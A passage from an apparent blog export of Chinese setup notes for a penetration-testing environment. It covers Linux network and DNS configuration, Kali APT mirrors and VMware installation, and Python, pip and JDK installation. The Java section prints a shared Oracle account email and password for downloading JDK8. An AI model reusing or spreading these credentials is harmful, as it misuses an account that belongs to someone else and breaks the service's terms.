自动获取ip地址</span><br><span class="line">　　b. none 固定的ip地址</span><br><span class="line">　　c. static 固定的ip地址</span><br><span class="line">8. IPADDR=10.0.0.100 IPADDR ip地址</span><br><span class="line">9. NETMASK=255.255.255.0 子网掩码 决定这个局域网中最多有多少台机器</span><br><span class="line">10. GATEWAY=10.0.0.2 网关 整个大楼的大门</span><br><span class="line">11. USERCTL=no 普通用户是否能控制网卡</span><br><span class="line">12. /etc/resolv.conf 配置DNS 网卡配置文件的DNS优先于/etc/resolv.conf</span><br><span class="line">13. DNS 域名解析器 阿里的域名解析器：223.5.5.5 223.6.6.6</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">重启网卡命令（centos）</span></span><br><span class="line">/etc/init.d/network restart</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">或者</span></span><br><span class="line">nmcli c reload</span><br><span class="line"></span><br><span class="line">例子：</span><br><span class="line">HWADDR=00:0c:29:2d:d7:44</span><br><span class="line">TYPE=Ethernet</span><br><span class="line">PROXY_METHOD=none</span><br><span class="line">BROWSER_ONLY=no</span><br><span class="line">BOOTPROTO=none</span><br><span class="line">IPADDR=192.168.22.11</span><br><span class="line">PREFIX=24</span><br><span class="line">GATEWAY=192.168.22.1</span><br><span class="line">DEFROUTE=yes</span><br><span class="line">IPV4_FAILURE_FATAL=no</span><br><span class="line">IPV6INIT=yes</span><br><span class="line">IPV6_AUTOCONF=yes</span><br><span class="line">IPV6_DEFROUTE=yes</span><br><span class="line">IPV6_FAILURE_FATAL=no</span><br><span class="line">IPV6_ADDR_GEN_MODE=stable-privacy</span><br><span class="line">NAME=ens37</span><br><span class="line">UUID=a18a03de-36a2-36a2-8514-0232129b08b0</span><br><span class="line">ONBOOT=yes</span><br><span class="line">AUTOCONNECT_PRIORITY=-999</span><br></pre></td></tr></table></figure><h3 id="ubuntu"><a href="#ubuntu" class="headerlink" title="ubuntu"></a>ubuntu</h3><h4 id="IP"><a href="#IP" class="headerlink" title="IP"></a>IP</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查看自己的网卡编号</span></span><br><span class="line">ip a</span><br><span class="line"><span class="comment">#配置网卡静态或者动态IP：</span></span><br><span class="line">vim /etc/network/interfaces</span><br><span class="line"><span class="comment">#配置DNS：</span></span><br><span class="line">vim /etc/resolv.conf</span><br><span class="line">vim /etc/systemd/resolved.conf</span><br><span class="line"><span class="comment">#重启服务</span></span><br><span class="line">service networking restart</span><br><span class="line">service network-manager restart</span><br><span class="line"><span class="comment">#或者--建议使用，新版的操作</span></span><br><span class="line">systemctl restart network.service</span><br><span class="line"><span class="comment">#自动获取IP(在固定IP模式下不生效）：</span></span><br><span class="line">dhclient</span><br><span class="line"><span class="comment">#启动网卡:当ifconfig后，只看到lo网卡时，那说明eth0网卡，并没有启动，这个时候使用启动网卡的命令</span></span><br><span class="line">ifconfig eth0 up</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">配置静态IP：/etc/network/interfaces</span></span><br><span class="line">auto lo  # lo接口会在系统启动时自动配置</span><br><span class="line">iface lo inet loopback  # 将lo接口设置为一个本地回环(loopback)地址</span><br><span class="line"></span><br><span class="line">auto eth0</span><br><span class="line">iface eth0 inet static</span><br><span class="line">address 192.168.1.228</span><br><span class="line">netmask 255.255.255.0</span><br><span class="line">gateway 192.168.1.1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">动态获取IP配置方法：</span></span><br><span class="line">auto ens33  # ens33接口会在系统启动时自动配置</span><br><span class="line">iface ens33 inet dhcp</span><br></pre></td></tr></table></figure><h4 id="Ubuntu20-04-LTS版本修改DNS"><a href="#Ubuntu20-04-LTS版本修改DNS" class="headerlink" title="Ubuntu20.04 LTS版本修改DNS"></a><strong>Ubuntu20.04 LTS版本修改DNS</strong></h4><p>修改 &#x2F;etc&#x2F;systemd&#x2F;resolved.conf 文件，在其中添加dns信息</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim  /etc/systemd/resolved.conf</span><br><span class="line">DNS=114.114.114.114 192.168.10.213 192.168.22.1 192.168.33.1</span><br><span class="line"></span><br><span class="line"><span class="comment">#可提供的DNS服务器</span></span><br><span class="line">nameserver 223.5.5.5</span><br><span class="line">nameserver 192.168.10.213</span><br><span class="line">nameserver 192.168.22.1</span><br><span class="line">nameserver 192.168.33.1</span><br><span class="line">nameserver 8.8.8.8</span><br></pre></td></tr></table></figure><p>在ubuntu终端中依次执行如下命令：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart systemd-resolved</span><br><span class="line">systemctl <span class="built_in">enable</span> systemd-resolved</span><br><span class="line"><span class="built_in">mv</span> /etc/resolv.conf /etc/resolv.conf.bak</span><br><span class="line"><span class="built_in">ln</span> -s /run/systemd/resolve/resolv.conf /etc/</span><br><span class="line"><span class="comment">#原本所谓的/etc/resolv.conf文件就是指向/run/systemd/resolve/resolv.conf的软链接</span></span><br></pre></td></tr></table></figure><p>再查看<code>cat /etc/resolv.conf</code>文件就可以看到新的dns信息已经写入其中了。</p><p>最后重启NetworkManager：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart NetworkManager</span><br></pre></td></tr></table></figure><h2 id="设置APT源"><a href="#设置APT源" class="headerlink" title="设置APT源"></a>设置APT源</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> /etc/apt/sources.list /etc/apt/sources.list.bak</span><br><span class="line">vim /etc/apt/sources.list</span><br><span class="line">apt-get update</span><br><span class="line">apt-get clean</span><br><span class="line"><span class="comment">#中科大</span></span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line"><span class="comment">#阿里云</span></span><br><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure><h2 id="APT使用"><a href="#APT使用" class="headerlink" title="APT使用"></a>APT使用</h2><h3 id="apt-get-amp-apt"><a href="#apt-get-amp-apt" class="headerlink" title="apt-get &amp; apt"></a>apt-get &amp; apt</h3><p>apt-get  可以从认证软件源下载软件包及相关信息，以便安装和升级软件包，或者用于移除软件包。在这些过程中，软件包依赖会被妥善处理。</p><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">update - 取回更新的软件包列表信息</span><br><span class="line">upgrade - 进行一次升级</span><br><span class="line">install - 安装新的软件包(注：软件包名称是 libc6 而非libc6.deb)</span><br><span class="line">reinstall - Reinstall packages (pkg is libc6 not libc6.deb)</span><br><span class="line">remove - 卸载软件包</span><br></pre></td></tr></table></figure><h3 id="apt-与-apt-get的区别与解释"><a href="#apt-与-apt-get的区别与解释" class="headerlink" title="apt 与 apt-get的区别与解释"></a>apt 与 apt-get的区别与解释</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">简单来说就是：apt = apt-get、apt-cache 和 apt-config 中最常用命令选项的集合。</span><br></pre></td></tr></table></figure><ul><li>虽然 apt  与 apt-get  有一些类似的命令选项，但它并不能完全向下兼容 apt-get  命令。也就是说，可以用 apt  替换部分 apt-get  系列命令，但不是全部。</li><li>apt  可以看作 apt-get  和 apt-cache  命令的子集, 可以为包管理提供必要的命令选项。</li><li>apt-get  虽然没被弃用，但作为普通用户，还是应该首先使用 apt 。</li></ul><table><thead><tr><th align="center">apt 命令</th><th align="center">取代的命令</th><th align="center">命令的功能</th></tr></thead><tbody><tr><td align="center">apt install</td><td align="center">apt-get install</td><td align="center">安装软件包</td></tr><tr><td align="center">apt remove</td><td align="center">apt-get remove</td><td align="center">移除软件包</td></tr><tr><td align="center">apt purge</td><td align="center">apt-get purge</td><td align="center">移除软件包及配置文件</td></tr><tr><td align="center">apt update</td><td align="center">apt-get update</td><td align="center">刷新存储库索引</td></tr><tr><td align="center">apt upgrade</td><td align="center">apt-get upgrade</td><td align="center">升级所有可升级的软件包</td></tr><tr><td align="center">apt autoremove</td><td align="center">apt-get autoremove</td><td align="center">自动删除不需要的包</td></tr><tr><td align="center">apt full-upgrade</td><td align="center">apt-get dist-upgrade</td><td align="center">在升级软件包时自动处理依赖关系</td></tr><tr><td align="center">apt search</td><td align="center">apt-cache search</td><td align="center">搜索应用程序</td></tr><tr><td align="center">apt show</td><td align="center">apt-cache show</td><td align="center">显示装细节</td></tr></tbody></table><p>当然，apt 还有一些自己的命令：</p><table><thead><tr><th align="center">新的apt命令</th><th align="center">命令的功能</th></tr></thead><tbody><tr><td align="center">apt list</td><td align="center">列出包含条件的包（已安装，可升级等）</td></tr><tr><td align="center">apt edit-sources</td><td align="center">编辑源列表</td></tr></tbody></table><p>需要大家注意的是：apt 命令也还在不断发展， 因此，你可能会在将来的版本中看到新的选项。</p><blockquote><p><a href="https://www.sysgeek.cn/apt-vs-apt-get/">Linux中apt与apt-get命令的区别与解释</a></p></blockquote><h2 id="设置中文"><a href="#设置中文" class="headerlink" title="设置中文"></a>设置中文</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#安装中文字体</span></span><br><span class="line">apt-get install xfonts-intl-chinese</span><br><span class="line">apt-get install ttf-wqy-microhei</span><br><span class="line"><span class="comment">#设置语言</span></span><br><span class="line">dpkg-reconfigure locales</span><br><span class="line"><span class="comment">#进入图形界面，选中 en_US.UTF-8 UTF-8 和 zh_CN.UTF-8 UTF-8 并将 zh_CN.UTF-8 选为默认。（空格是选择，tab是切换， * 是选中）</span></span><br><span class="line">重启</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><p><strong>Kali工具</strong>:</p><ul><li><a href="https://tools.kali.org/tools-listing">https://tools.kali.org/tools-listing</a></li><li><a href="https://github.com/Jack-Liang/kalitools">https://github.com/Jack-Liang/kalitools</a></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 工具+环境 </category>
          
          <category> Kali&amp;Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> 网络配置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux-Kali配置与使用</title>
      <link href="/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/Kali&amp;Linux/Linux-Kali%E9%85%8D%E7%BD%AE%E5%AE%89%E8%A3%85/"/>
      <url>/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/Kali&amp;Linux/Linux-Kali%E9%85%8D%E7%BD%AE%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<p>建议虚拟机搞kali~</p><h1 id="VMware安装"><a href="#VMware安装" class="headerlink" title="VMware安装"></a>VMware安装</h1><ol><li>通过scoop进行安装</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、安装软件镜像包源 scoop bucket add scoopet https://github.com/ivaquero/scoopet.git</span><br><span class="line">2、通过搜索 scoop search vmware</span><br><span class="line">3、进行下载安装 scoop install vmware-workstation-pro</span><br></pre></td></tr></table></figure><ol start="2"><li>下载vmware</li></ol><blockquote><p>Vmware官网：<a href="https://www.vmware.com/">https://www.vmware.com/</a></p></blockquote><ol start="3"><li>激活vmware</li></ol><h1 id="Kali简介"><a href="#Kali简介" class="headerlink" title="Kali简介"></a>Kali简介</h1><blockquote><p><a href="https://www.kali.org/docs/introduction/what-is-kali-linux/">https://www.kali.org/docs/introduction/what-is-kali-linux/</a></p></blockquote><h2 id="Kali下载"><a href="#Kali下载" class="headerlink" title="Kali下载"></a>Kali下载</h2><blockquote><p>Kali官网下载：</p><p>Get Kali | Kali Linux：<a href="https://www.kali.org/get-kali/">https://www.kali.org/get-kali/</a></p><p><a href="https://kali.download/virtual-images/kali-2022.1/kali-linux-2022.1-vmware-amd64.7z">https://kali.download/virtual-images/kali-2022.1/kali-linux-2022.1-vmware-amd64.7z</a></p></blockquote><h1 id="Vmware安装Kali"><a href="#Vmware安装Kali" class="headerlink" title="Vmware安装Kali"></a>Vmware安装Kali</h1><p>解压下载的压缩包 kali-linux-2022.1-vmware-amd64.7z , 双击打开下.vmx 文件</p><p>点击 开启此虚拟机 ，即可启动。</p><p>系统已经配置好默认普通用户 kali ，默认密码 kali </p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 工具+环境 </category>
          
          <category> Kali&amp;Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python环境安装</title>
      <link href="/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/Python%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/"/>
      <url>/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/Python%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows安装Python2-x2F-3"><a href="#Windows安装Python2-x2F-3" class="headerlink" title="Windows安装Python2&#x2F;3"></a>Windows安装Python2&#x2F;3</h1><h2 id="通过scoop安装"><a href="#通过scoop安装" class="headerlink" title="通过scoop安装"></a>通过scoop安装</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、添加versions镜像源 scoop bucket add versions</span><br><span class="line">2、通过命令进行搜索 scoop search python</span><br><span class="line">3、选定对应的python版本进行安装</span><br><span class="line">scoop install python27</span><br><span class="line">scoop install python</span><br></pre></td></tr></table></figure><h2 id="Python官网下载安装"><a href="#Python官网下载安装" class="headerlink" title="Python官网下载安装"></a>Python官网下载安装</h2><h3 id="下载安装程序："><a href="#下载安装程序：" class="headerlink" title="下载安装程序："></a>下载安装程序：</h3><blockquote><p><a href="https://www.python.org/ftp/python/3.7.7/python-3.7.7-amd64.exe">https://www.python.org/ftp/python/3.7.7/python-3.7.7-amd64.exe</a></p><p><a href="https://www.python.org/downloads/release/python-377/">https://www.python.org/downloads/release/python-377/</a></p></blockquote><p>Customize installation：自定义安装pip、IDLE、安装路径等</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208180111556.png" alt="image-20220818011126154" style="zoom:50%;" /><h3 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h3><ol><li>点击此电脑选择高级系统设置，在选择环境变量</li><li>找到path</li><li>添加python的安装路径到此处即可</li><li>添加pip的环境变量，同理，pip在python的scripts目录下及添加到path中即可</li></ol><h3 id="验证安装"><a href="#验证安装" class="headerlink" title="验证安装"></a>验证安装</h3><ol><li>使用windows+R键，打开cmd输入python显示出python版本既配置成功</li><li>pip配置是否成功。输入pip3 看是否提示出帮助信息。</li></ol><h1 id="Linux安装Python2-x2F-3"><a href="#Linux安装Python2-x2F-3" class="headerlink" title="Linux安装Python2&#x2F;3"></a>Linux安装Python2&#x2F;3</h1><h2 id="一些注意事项："><a href="#一些注意事项：" class="headerlink" title="一些注意事项："></a>一些注意事项：</h2><p>在linux中存在多个版本python，这个时候，我们如果想在指定版本的目录里安装相应的模块，应该是使用：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install --target=目标路径  工具包名字</span><br></pre></td></tr></table></figure><blockquote><p>参考：<a href="https://blog.csdn.net/qq_33547191/article/details/86552214">https://blog.csdn.net/qq_33547191/article/details/86552214</a></p></blockquote><h2 id="安装Python2"><a href="#安装Python2" class="headerlink" title="安装Python2"></a>安装Python2</h2><p>一般Linux系统默认安装Python2.7，因此无需额外安装</p><h2 id="安装Python3"><a href="#安装Python3" class="headerlink" title="安装Python3"></a>安装Python3</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p /usr/local/python3</span><br><span class="line">yum -y install wget gcc libffi-devel</span><br><span class="line">wget https://www.python.org/ftp/python/3.7.7/Python-3.7.7.tgz</span><br><span class="line">tar -zxf Python-3.7.7.tgz</span><br><span class="line"><span class="built_in">cd</span> Python-3.7.7</span><br><span class="line">./configure --prefix=/usr/local/python3</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure><p>修改PATH环境变量</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s /usr/local/python3/bin/python3 /usr/bin/python3</span><br><span class="line">yum –y install python3-pip</span><br><span class="line">将/usr/local/python3/bin加入PATH：</span><br><span class="line">vim /etc/profile</span><br><span class="line">PATH=<span class="variable">$PATH</span>:/usr/local/python3/bin</span><br></pre></td></tr></table></figure><p>python3默认版本</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi /etc/profile.d/python.sh           <span class="comment">#编辑用户自定义配置，输入alias参数</span></span><br><span class="line"><span class="built_in">alias</span> python=<span class="string">&#x27;/usr/local/bin/python3.8&#x27;</span>    <span class="comment">#这里写你的python路径</span></span><br><span class="line"><span class="built_in">source</span> /etc/profile.d/python.sh         <span class="comment">#重启会话使配置生效</span></span><br></pre></td></tr></table></figure><h1 id="Mac安装Python2-x2F-3"><a href="#Mac安装Python2-x2F-3" class="headerlink" title="Mac安装Python2&#x2F;3"></a>Mac安装Python2&#x2F;3</h1><p>系统默认安装Python2.7，因此无需额外安装</p><h2 id="安装Python3-1"><a href="#安装Python3-1" class="headerlink" title="安装Python3"></a>安装Python3</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">brew install python3</span><br></pre></td></tr></table></figure><h2 id="不同版本Python路径"><a href="#不同版本Python路径" class="headerlink" title="不同版本Python路径"></a>不同版本Python路径</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">系统默认(2.7)：</span><br><span class="line">/System/Library/Frameworks/Python.framework/Versions/2.7</span><br><span class="line">brew安装(2.7/3.x)：</span><br><span class="line">/usr/local/Cellar/python</span><br><span class="line">官网pkg安装(3.x)</span><br><span class="line">/Library/Frameworks/Python.framework/Versions/3.x</span><br></pre></td></tr></table></figure><h2 id="配置Python2和Python3"><a href="#配置Python2和Python3" class="headerlink" title="配置Python2和Python3"></a>配置Python2和Python3</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim ~/.bash_profile</span><br><span class="line"># Setting PATH for Python 2.7</span><br><span class="line">PATH=&quot;/System/Library/Frameworks/Python.framework/Versions/2.7/bin:$&#123;PATH&#125;&quot;</span><br><span class="line">export PATH</span><br><span class="line"># Setting PATH for Python 3.x</span><br><span class="line">PATH=&quot;/usr/local/Cellar/python/3.x/bin:$&#123;PATH&#125;&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim ~/.bashrc</span><br><span class="line">alias python2=&#x27;/System/Library/Frameworks/Python.framework/Versions/2.7/bin/python2.7&#x27;</span><br><span class="line">alias python3=&#x27;/usr/local/Cellar/python/3.x/bin/python3.x&#x27;</span><br><span class="line">source ~/.bash_profile</span><br><span class="line">source ~/.bashrc</span><br></pre></td></tr></table></figure><h1 id="安装pip"><a href="#安装pip" class="headerlink" title="安装pip"></a>安装pip</h1><h2 id="pip简介"><a href="#pip简介" class="headerlink" title="pip简介"></a>pip简介</h2><p>pip 是一个 Python 包安装与管理工具。Kali2022 默认安装 python2.7 和 python3. 9 ，但需自行配置 pip</p><p>python pip各版本的安装，最好用脚本下载，</p><h2 id="apt安装方式"><a href="#apt安装方式" class="headerlink" title="apt安装方式"></a>apt安装方式</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install python3-pip </span><br><span class="line">apt install python-pip</span><br></pre></td></tr></table></figure><h2 id="脚本下载安装方式"><a href="#脚本下载安装方式" class="headerlink" title="脚本下载安装方式"></a>脚本下载安装方式</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#pip3 清华源下载</span></span><br><span class="line">wget https://bootstrap.pypa.io/get-pip.py   </span><br><span class="line">python get-pip.py -i https://pypi.tuna.tsinghua.edu.cn/simple/</span><br><span class="line"></span><br><span class="line"><span class="comment">#pip2：</span></span><br><span class="line">curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip2.py</span><br><span class="line">python2 get-pip2.py</span><br><span class="line"></span><br><span class="line"><span class="comment">#pip3：</span></span><br><span class="line">curl https://bootstrap.pypa.io/get-pip.py -o get-pip3.py</span><br><span class="line">python3 get-pip3.py &amp; pip3 list</span><br></pre></td></tr></table></figure><h2 id="pip安装-Python-库"><a href="#pip安装-Python-库" class="headerlink" title="pip安装 Python 库"></a>pip安装 Python 库</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo pip3 install pwntools</span><br><span class="line">pip使用国内代理：</span><br><span class="line">pip3 install -r requirements.txt -i https://mirrors.ustc.edu.cn/pypi/web/simple</span><br></pre></td></tr></table></figure><h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><ul><li>python site-packages目录：</li></ul><p>python第三方包都安装到了site-packages目录下了。 我们可以通过下面的python代码来找到它的位置：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.path.dirname(os.__file__)</span><br></pre></td></tr></table></figure><ul><li>python安装第三方包的安装路径，dist-packages和site-packages区别：</li></ul><p>简单来说便是，如果是系统自带的python，会使用dist-packages目录；如果你手动安装python，它会直接使用目录site-packages。</p><blockquote><p>参考：<a href="https://blog.csdn.net/cc1949/article/details/78286224">https://blog.csdn.net/cc1949/article/details/78286224</a></p></blockquote><ul><li>pip、pip2和pip3区别：</li></ul><p>pip和pip2相同，均对应Python2.x版本。pip3对应Python3.x版本。</p><p>对应版本下载对应版本的模块</p><blockquote><p>参考：<a href="http://www.javashuo.com/article/p-snbrspvb-my.html">http://www.javashuo.com/article/p-snbrspvb-my.html</a></p></blockquote><ul><li>多个python版本共存问题</li></ul><p>python安装时，注意到环境变量path的配置是为了在命令行可以直接使用相关的.exe文件，</p><p>我们将python2.7和python3.8，目录都引入path中，再将两个目录下的python.exe，更名为python2.exe和python3.exe，这样在cmd中使用python时，不会冲突</p><p>另外需要修改在Windows起始栏的快捷位置：</p><p>注意目标位置和起始位置：这些都是要修改的，我只修改了python3的，因为python idle用python3来执行。如果要用python2，用命令行来执行</p><p>起始位置：”D:\Program Files (x86)\python3.8”</p><p>目标：”D:\Program Files (x86)\python3.8\pythonw.exe” “D:\Program Files (x86)\python3.8\Lib\idlelib\idle.pyw”</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208180122330.png" alt="image-20220818012259063" style="zoom: 33%;" /><p>关于python2，因为其是以msi形式安装的，很难去修改路径，出了很多问题，所以改python.exe安装</p><p>艹了，妈的，python2和3都重装！！</p><ul><li>讲到Linux基础，我归纳入Linux学习部分</li><li>python3.8版本降低至3.6，怎么合理选择自己想要的python版本，怎么设置！？？</li></ul><blockquote><p><a href="https://blog.csdn.net/weixin_42919435/article/details/109523985">https://blog.csdn.net/weixin_42919435/article/details/109523985</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 工具+环境 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java环境安装</title>
      <link href="/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/Java%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/"/>
      <url>/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/Java%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<h1 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h1><ul><li>java安装时，jdk和jre尽量不在同一个目录</li><li>关于jdk8以上版本的jdk，jre文件夹是运行Java程序必不可少的运行环境，比如我们在玩Java版的Minecraft时就必须配置jre的路径。通常我们给用户使用的Java程序中都需要有jre来运行，我们自己做小项目时也是需要jre的。不走运的是新版本的jdk中似乎没有jre的存在，这是因为在Java8之后在安装jdk时便不再提供jre的安装，而是让我们根据自己的需要自行的安装，接下来我会展示如何自己安装jre文件夹（以Java11为例）。</li></ul><blockquote><p>原文链接：<a href="https://blog.csdn.net/qq_41219157/article/details/109667631">https://blog.csdn.net/qq_41219157/article/details/109667631</a></p></blockquote><h1 id="Windows安装JDK8"><a href="#Windows安装JDK8" class="headerlink" title="Windows安装JDK8"></a>Windows安装JDK8</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过scoop安装</span><br><span class="line">scoop添加官方镜像源（如添加不成功可使用代理方式）</span><br><span class="line">1、通过命令 scoop bucket known 查看官方镜像</span><br><span class="line">2、添加官方包源 scoop bucket add java</span><br><span class="line">3、查看添加成功的源 scoop bucket list</span><br><span class="line">通过scoop安装 </span><br><span class="line">1、通过scoop搜索jdk scoop search jdk8</span><br><span class="line">2、选择对于版本进行下载安装</span><br><span class="line">3、验证安装</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">手动安装</span><br><span class="line">下载 JDK8</span><br><span class="line">https://www.oracle.com/java/technologies/javase-jdk8-downloads.html</span><br><span class="line">账号密码：https://blog.csdn.net/Virgil_K2017/article/details/90260880</span><br><span class="line">账号： liwei@xiaostudy.com </span><br><span class="line">密码： OracleTest1234</span><br><span class="line">安装 JDK8</span><br><span class="line">配置 PATH  环境变量</span><br><span class="line">Win + R  快捷键打开运行窗口，输入 sysdm.cpl  打开系统属性，选择高级，环境变量</span><br><span class="line"> </span><br><span class="line">新建如下环境变量及值：</span><br><span class="line">变量：Java_Home</span><br><span class="line">值：C:\Program Files\Java</span><br><span class="line"> </span><br><span class="line">变量：CLASSPATH</span><br><span class="line">值：.;%Java_Home%\jdk1.8.0_321\bin;%Java_Home%\jdk1.8.0_321\lib\dt.jar;%Java_Home%\jdk1.8.0_321\lib\tools.jar</span><br><span class="line"></span><br><span class="line">变量：Path</span><br><span class="line">值：%Java_Home%\jdk1.8.0_321\bin</span><br><span class="line">    %Java_Home%\jre1.8.0_321\bin</span><br><span class="line">验证安装</span><br><span class="line">Win + R  运行窗口输入 cmd  打开命令提示符，输入 java -version 、 javac -version</span><br></pre></td></tr></table></figure><h1 id="Linux安装JDK8"><a href="#Linux安装JDK8" class="headerlink" title="Linux安装JDK8"></a>Linux安装JDK8</h1><ol><li>切换linux java及javac版本：</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">切换java：</span><br><span class="line">update-alternatives --config java</span><br><span class="line">切换javac：</span><br><span class="line">update-alternatives --config javac</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://blog.xsot.cn/archives/illegalreflective.html">https://blog.xsot.cn/archives/illegalreflective.html</a></p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">包管理器安装（新手推荐）：</span><br><span class="line"><span class="comment"># centos、redhat等</span></span><br><span class="line">yum -y list java*</span><br><span class="line">yum install java-1.8.0-openjdk* -y</span><br><span class="line"></span><br><span class="line"><span class="comment"># debian、ubuntu、kali等</span></span><br><span class="line">apt-cache search java | grep jdk</span><br><span class="line">apt install openjdk-8-jre-headless</span><br><span class="line">apt install openjdk-8-jdk-headless</span><br><span class="line">apt install openjdk-11-jdk</span><br><span class="line"></span><br><span class="line">源码安装（新手不推荐）：</span><br><span class="line">mdkir /usr/java</span><br><span class="line"><span class="built_in">cd</span> /usr/java</span><br><span class="line">tar -zxvf jdk-8u241-linux-x64.tar.gz</span><br><span class="line"><span class="built_in">mv</span> jdk-1.8._241 jdk8</span><br><span class="line">vim /etc/profile    <span class="comment"># 编辑profile配置文件，添加如下内容</span></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/usr/java/jdk8</span><br><span class="line"><span class="built_in">export</span> JRE_HOME=<span class="variable">$&#123;JAVA_HOME&#125;</span>/jre</span><br><span class="line"><span class="built_in">export</span> CLASSPATH=.:<span class="variable">$&#123;JAVA_HOME&#125;</span>/lib:<span class="variable">$&#123;JRE_HOME&#125;</span>/lib:<span class="variable">$CLASSPATH</span></span><br><span class="line"><span class="built_in">export</span> JAVA_PATH=<span class="variable">$&#123;JAVA_HOME&#125;</span>/bin:<span class="variable">$&#123;JRE_HOME&#125;</span>/bin</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$&#123;JAVA_PATH&#125;</span></span><br><span class="line"></span><br><span class="line">验证安装：</span><br><span class="line"><span class="built_in">source</span> /etc/profile        <span class="comment">#让配置生效</span></span><br><span class="line">java --version</span><br></pre></td></tr></table></figure><h1 id="Mac安装JDK8"><a href="#Mac安装JDK8" class="headerlink" title="Mac安装JDK8"></a>Mac安装JDK8</h1><blockquote><p>Java Downloads | Oracle: <a href="https://www.oracle.com/java/technologies/downloads/#java8-mac">https://www.oracle.com/java/technologies/downloads/#java8-mac</a></p></blockquote><figure class="highlight 